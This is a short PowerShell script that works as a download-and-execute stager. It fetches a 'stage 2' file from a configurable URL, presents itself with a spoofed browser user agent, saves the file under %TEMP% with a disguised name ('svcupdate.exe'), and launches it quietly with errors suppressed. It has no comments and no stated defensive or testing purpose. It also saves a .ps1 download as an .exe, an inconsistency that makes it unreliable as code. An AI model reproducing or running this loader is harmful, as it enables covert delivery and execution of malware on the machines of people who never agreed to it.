
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://localhost:8080/updater.ps1",
    [string]$Stage2Path = "$env:TEMP\svcupdate.exe",
    [int]$StageTimeout = 223,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $Stage2Path -TimeoutSec $StageTimeout -UserAgent $RequestAgent
if ($FetchResult) {
    Start-Process -FilePath $Stage2Path -ErrorAction SilentlyContinue
}

$ProgressPreference = "SilentlyContinue"
Set-Location -Path $env:TEMP
